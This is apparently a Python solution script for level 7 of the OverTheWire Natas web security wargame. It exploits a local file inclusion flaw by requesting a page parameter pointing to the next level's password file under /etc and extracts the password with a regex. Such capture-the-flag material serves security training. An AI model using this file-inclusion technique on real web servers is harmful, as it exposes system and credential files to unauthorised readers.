import re
import requests
from halo import Halo


def get_natas8_password(natas7_password):
    URL = "http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8"
    spinner = Halo(text='The password for natas 8 is: ',
                   spinner='bouncingBar', color="blue")
    spinner.start()

    session = requests.Session()
    session.auth = ("natas7", natas7_password)
    response = session.get(URL)
    natas8_password = re.findall(r"([a-zA-Z\d]{32})", response.text)[1]

    spinner.succeed(text="The password for natas 8 is: " + natas8_password)

    return natas8_password


if __name__ == '__main__':
    natas7_password = ""  # Put here the password for natas7 here
    get_natas8_password(natas7_password)
